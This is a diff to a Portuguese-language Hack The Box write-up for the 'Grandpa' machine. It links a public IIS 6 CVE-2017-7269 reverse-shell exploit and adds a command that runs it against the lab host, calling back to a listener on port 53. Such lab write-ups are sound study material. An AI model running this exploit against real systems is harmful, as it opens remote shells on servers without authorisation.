@@ -29,3 +29,9 @@ Percebemos que existe apenas a porta 80 aberta, rodando uma servidor WEB na vers
 Lembro que na maquina [Granny](https://an4kein.github.io/hackthebox/2020/06/24/HTB-Granny/)  explorei uma versao identica, logo vou testar o exploit usado nela pra tentar obter exito.. 
 
 ***preference*** https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
+
+Entao, executamos o exploit apos configurar nossa porta de preferencia para ficar escultando, eu escolhi a 53
+
+`sudo python iis6-cve-2017-7269.py 10.10.10.14 80 10.10.14.36 53`
+
+![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/2.jpg)
